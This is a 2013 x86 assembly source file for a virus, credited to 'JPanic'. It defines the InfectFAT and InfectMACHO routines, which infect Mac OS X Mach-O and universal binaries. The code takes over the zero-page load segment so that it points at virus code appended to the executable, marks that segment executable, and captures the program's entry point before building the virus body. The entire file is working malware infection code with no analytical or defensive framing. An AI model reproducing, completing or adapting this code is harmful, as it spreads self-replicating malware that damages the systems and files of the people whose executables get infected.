;= MACHO Infection Routine Definitions (c) 2013 JPanic ====================
;
; Provides routines for infection of MACHO, FAT executables.
;
; PUBLICS:
;	InfectMACHO()
;	InfectFAT()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\macho.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= InfectFAT ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectFAT
InfectFAT		PROC
			mov	eax,[ebx.fathdr_nfat_arch]
			bswap	eax
			dec	eax
			js	@@ret
			imul	esi,eax,size fat_arch
			lea	esi,[esi+ebx+size fat_header]
			; eax = last fat_arch
			lodsd
			bswap	eax
			cmp	eax,mach_CPU_TYPE_I386	; fat_cputype
			jne	@@ret
			lodsd				; fat_cpusubtype
			lodsd				; fat_offset
			bswap	eax
			mov	edi,[vheap.dwFileSize]	; EDI = FAT File Size
			cmp	eax,edi
			jae	@@ret
			test	ax,0FFFh		; fat_offset 4k boundary?
			jnz	@@jne_ret$0
			xchg	ecx,eax			; ECX == MACH offset
			lodsd				; fat_size
			bswap	eax
			lea	edx,[eax+ecx]		; EDX = EOF
			cmp	edx,edi
			jne	@@ret
			lodsd				; fat_align
			bswap	eax
			cmp	eax,0ch
		@@jne_ret$0:
			jne	@@ret			
			mov	edi,[(esi - size fat_arch).fat_size]
			bswap	edi
			; ebx = FAT image, esi = fat_arch struc, edx = FAT file length, edi = macho size
			pusha
			; prepare and call InfectMacho
			mov	eax,[(esi - size fat_arch).fat_offset]
			bswap	eax
			add	ebx,eax
			cmp	dwo [ebx],mach_MH_MAGIC
			jne	@@nomacho
			mov	[vheap.dwFileSize],edi
			call	InfectMACHO	
		@@nomacho:
			popa
			cmp	[vheap.dwFileSize],edi
			je	@@nofix			
				mov	edi,[vheap.dwFileSize]
				mov	edx,[(esi - size fat_arch).fat_offset]
				bswap	edx
				add	edx,edi			
				bswap	edi
				mov	[(esi - size fat_arch).fat_size],edi
		@@nofix:mov	[vheap.dwFileSize],edx
		@@ret:	ret
InfectFAT	ENDP

;= InfectMACHO ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectMACHO
InfectMACHO		PROC			
			cmp	dwo [ebx.mach_cputype],mach_CPU_TYPE_I386			
			jne	@@ret_nz$00
			cmp	dwo [ebx.mach_filetype],mach_MH_EXECUTE			
		@@ret_nz$00:
			jne	@@ret
			mov	ecx,dwo [ebx.mach_ncmds]			
			jecxz	@@ret
			push	ebx
			lea	esi,[ebx+(size mach_header)]			
			; edi = LC_SEGMENT ZERO PAGE
			; edx = LC_UNIXTHREAD,i386_NEW_THREAD_STATE
			xor	edx,edx
			xor	edi,edi
		@@cmdloop:	mov	al,by [esi.by mach_ldcmd_cmd]			
				cmp	al,mach_LC_SEGMENT
				lea	ebx,[esi+8]
				jne	@@not_segment
					test	edi,edi
					jnz	@@nextcmd
					cmp	[ebx.mach_segcmd_vmaddr],edi
					jne	@@nextcmd
					cmp	[ebx.mach_segcmd_filesize],edi
					jne	@@nextcmd
					mov	edi,ebx
					jmp	@@nextcmd					
		@@not_segment:	cmp	al,mach_LC_UNIXTHREAD
				jne	@@nextcmd
					test	edx,edx
					jnz	@@nextcmd
					cmp	dwo [ebx.mach_threadcmd_flavor],mach_i386_NEW_THREAD_STATE
					jne	@@nextcmd
					lea	edx,[ebx+8]
		;@@not_unix_thread:		
		@@nextcmd:
			add	esi,[esi.mach_ldcmd_cmdsize]
			loop	@@cmdloop
			pop	ebx
			test	edi,edi
			jz	@@ret_z$00
			test	edx,edx
		@@ret_z$00:
			jz	@@ret
			mov	esi,[vheap.dwFileSize]
			mov	ecx,0FFFh
			add	esi,ecx
			not	ecx
			and	esi,ecx			
			mov	dwo [edi.mach_segcmd_vmsize],1000h			
			mov	dwo [edi.mach_segcmd_fileoff],esi			
			mov	ecx,[vheap.dwVirusSize]
			mov	dwo [edi.mach_segcmd_filesize],ecx
			add	ebx,esi
			add	esi,ecx
			mov	[vheap.dwFileSize],esi
			or	dwo [edi.mach_segcmd_maxprot],5
			or	dwo [edi.mach_segcmd_initprot],5		
			mov	edi,ebx
			xor	eax,eax
			xchg	eax,dwo [edx.mach_i386_eip]			
                        mov     dl,OS_Proc_Use_OSX                        
                        call    BuildVBody
		@@ret:	ret
InfectMACHO		ENDP

;==========================================================================
                ENDS
		END
;==========================================================================
